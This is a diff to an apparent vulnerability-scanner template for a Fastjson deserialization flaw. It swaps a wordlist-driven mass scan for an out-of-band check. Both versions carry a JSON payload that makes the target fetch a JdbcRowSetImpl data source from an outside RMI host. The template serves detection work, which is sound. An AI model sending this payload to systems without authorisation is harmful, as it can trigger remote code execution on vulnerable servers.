@@ -8,13 +8,17 @@ info:
   severity: critical
   tags: fastjson,rce,deserialization,oast
 requests:
-- attack: sniper
-  payloads:
-    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+- matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+  - negative: true
+    status:
+    - 200
+    type: status
+  matchers-condition: and
   raw:
-  - "POST / HTTP/1.1\nHost: {{Subdomains}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;\
-    \ rv:68.0) Gecko/20100101 Firefox/68.0\nAccept-Encoding: gzip, deflate\nAccept:\
-    \ */*\nContent-Type: application/json\n\n{\n   \"@type\":\"com.sun.rowset.JdbcRowSetImpl\"\
-    ,\n   \"dataSourceName\":\"rmi://{{Host}}.{{Port}}.{{Subdomains}}.fastjson.{{MY-DOMAIN}}/Exploit\"\
-    ,\n   \"autoCommit\":true\n}"
-  threads: 100
+  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
+    \ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n   \"dataSourceName\":\"rmi://{{interactsh-url}}/Exploit\"\
+    ,\n   \"autoCommit\":true\n}\n"
